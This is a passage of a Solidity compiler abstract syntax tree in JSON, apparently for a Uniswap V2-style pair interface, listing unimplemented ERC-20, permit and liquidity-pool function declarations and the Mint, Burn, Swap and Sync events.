													"nodeType": "ElementaryTypeName",
													"src": "682:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "681:9:4"
									},
									"scope": 852,
									"src": "586:105:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 664,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 660,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 657,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "714:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 656,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "714:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 659,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "731:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 658,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "731:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "713:32:4"
									},
									"returnParameters": {
										"id": 663,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 662,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "764:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 661,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "764:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "763:6:4"
									},
									"scope": 852,
									"src": "697:73:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 673,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 669,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 666,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "794:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 665,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "794:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 668,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "806:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 667,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "806:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "793:27:4"
									},
									"returnParameters": {
										"id": 672,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 671,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "839:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 670,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "839:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "838:6:4"
									},
									"scope": 852,
									"src": "776:69:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 684,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 680,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 675,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "882:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 674,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "882:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 677,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "904:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 676,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "904:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 679,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "924:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 678,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "924:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "872:71:4"
									},
									"returnParameters": {
										"id": 683,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 682,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "962:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 681,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "962:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "961:6:4"
									},
									"scope": 852,
									"src": "851:117:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 689,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 685,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "999:2:4"
									},
									"returnParameters": {
										"id": 688,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 687,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 689,
												"src": "1025:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 686,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1025:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1024:9:4"
									},
									"scope": 852,
									"src": "974:60:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 694,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "PERMIT_TYPEHASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 690,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1064:2:4"
									},
									"returnParameters": {
										"id": 693,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 692,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 694,
												"src": "1090:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 691,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1090:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1089:9:4"
									},
									"scope": 852,
									"src": "1040:59:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 701,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "nonces",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 697,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 696,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 701,
												"src": "1121:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 695,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1121:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1120:15:4"
									},
									"returnParameters": {
										"id": 700,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 699,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 701,
												"src": "1159:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 698,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1159:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1158:9:4"
									},
									"scope": 852,
									"src": "1105:63:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 718,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 716,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 703,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1199:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 702,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1199:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 705,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1222:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 704,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1222:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 707,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1247:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 706,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1247:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 709,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1270:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 708,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1270:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 711,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1296:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 710,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1296:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 713,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1313:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 712,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1313:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 715,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1332:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 714,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1332:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1189:158:4"
									},
									"returnParameters": {
										"id": 717,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1356:0:4"
									},
									"scope": 852,
									"src": "1174:183:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 726,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 720,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1374:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 719,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1374:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 722,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1398:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 721,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1398:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 724,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1415:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 723,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1415:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1373:58:4"
									},
									"src": "1363:69:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 736,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 735,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 728,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1457:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 727,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1457:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 730,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1489:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 729,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1489:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 732,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1514:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 731,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1514:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 734,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1539:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 733,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1539:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1447:116:4"
									},
									"src": "1437:127:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 750,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 749,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 738,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1589:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 737,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1589:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 740,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1621:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 739,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1621:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 742,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1648:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 741,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1648:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 744,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1675:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 743,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1675:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 746,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1703:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 745,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1703:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 748,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1731:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 747,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1731:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1579:176:4"
									},
									"src": "1569:187:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 756,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 755,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 752,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 756,
												"src": "1772:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 751,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1772:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 754,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 756,
												"src": "1790:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 753,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1790:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1771:36:4"
									},
									"src": "1761:47:4"
								},
								{
									"body": null,
									"documentation": null,
									"id": 761,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 757,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1840:2:4"
									},
									"returnParameters": {
										"id": 760,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 759,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 761,
												"src": "1866:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 758,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1866:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1865:9:4"
									},
									"scope": 852,
									"src": "1814:61:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 766,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 762,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1897:2:4"
									},
									"returnParameters": {
										"id": 765,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 764,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 766,
												"src": "1923:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 763,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1923:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1922:9:4"
									},
									"scope": 852,
									"src": "1881:51:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 771,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 767,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1953:2:4"
									},
									"returnParameters": {
										"id": 770,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 769,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "1979:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 768,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1979:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1978:9:4"
									},
									"scope": 852,
									"src": "1938:50:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 776,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 772,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2009:2:4"
									},
									"returnParameters": {
										"id": 775,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 774,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 776,
												"src": "2035:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 773,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2035:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2034:9:4"
									},
									"scope": 852,
									"src": "1994:50:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 785,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 777,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2070:2:4"
									},
									"returnParameters": {
										"id": 784,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 779,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2120:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 778,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2120:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 781,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2138:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 780,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2138:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
